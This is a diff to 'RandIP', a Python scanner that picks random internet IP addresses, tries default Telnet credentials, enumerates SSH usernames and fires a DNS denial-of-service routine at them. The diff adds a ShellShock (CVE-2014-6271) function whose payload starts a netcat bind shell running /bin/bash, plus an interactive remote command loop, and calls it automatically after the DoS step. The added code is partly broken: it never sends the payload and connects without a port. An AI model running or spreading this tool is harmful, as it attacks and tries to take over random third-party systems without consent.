@@ -1,4 +1,4 @@
-#RandIP 0.9.3 beta#
+#RandIP 0.9.4 beta#
 #Random IP Generator with Socket, SSH, Telnet, and HTML Screenshot support.#
 #Report bugs including uncontained exceptions to blmvxer@gmail.com#
 import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys
@@ -98,7 +98,7 @@ def WriteLog():
 	for hostr in hostlog:
 		os.remove(hostr)
 	os.remove(logfile)
-	print('Directory cleaned!, All sockets closed!, and Tor shutdown!')
+	print('Directory cleaned!, All sockets closed!')
 
 def print_bootstrap_lines(line):
   if "Bootstrapped " in line:
@@ -134,6 +134,27 @@ def tBindDOS():
 	sock.sendto(payload, (address, 53))
 	print('Done.')
 
+def ShellShock():
+	rport="80"
+	print('Using CVE:2014-6271(6278)')
+	print('Sending packet to ' + address + '...')
+	payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
+	try:
+		serversocket = socket(AF_INET, SOCK_STREAM)
+		time.sleep(1)
+		serversocket.connect(address)
+		print("[!] Successfully exploited")
+		print("[!] Connected to "+address)
+		stop=True
+		serversocket.settimeout(3)
+		while True:
+			reply = raw_input(address+"> ")
+			serversocket.sendall(reply+"\n")
+			data = serversocket.recv(buff)
+			print(data)
+	except:
+		pass
+
 for address in randip():
 	try:
 		try:
@@ -143,9 +164,12 @@ for address in randip():
 			s.connect((address, 80))
 			print address, "WORKS!!!"
 			b.append(address)
-			hostbyadr = socket.gethostbyaddr(address)
-			print hostbyadr
-			c.append(hostbyadr)
+			DNS = socket.gethostbyaddr(address)
+			hostname = DNS[0]
+			ipaddr = (",".join(DNS[2]))
+			DNSinfo = (hostname.ljust(10), ipaddr.rjust(20))
+			print(DNSinfo)
+			c.append(DNSinfo)
 			global myhost
 			myhost = 'http://' + address
 			req = requests.get('http://' + address)
@@ -170,6 +194,7 @@ for address in randip():
 			print('Beginning Telnet attempt on %s\n' % address)
 			#Default telnet connection using admin as user and password#
 			try:
+				telnettime=time.clock()
 				tn = telnetlib.Telnet(address, 3)
 				tn.read_until("login: ")
 				time.sleep(3)#Sometimes telnet takes a second after login#
@@ -181,8 +206,11 @@ for address in randip():
 				print tn.read_all()
 				d.append(tn.read_all())
 			except socket.error:
+				telend=time.clock()
+				totaltime = telend - telnettime
 				print(socket.error, 'Error Signing in or Telnet not accessible', address)
 				print '\n'
+				print(totaltime)
 				e.append(address)
 				pass
 			except EOFError:
@@ -214,6 +242,7 @@ for address in randip():
 					print('Possible username root based on enumeration exploit...')
 					print(total)
 					tBindDOS()
+					ShellShock()
 			except socket.timeout:
 				print(socket.timeout, '%s timeout SSH or SSH not accessible' % address)
 				g.append(address)
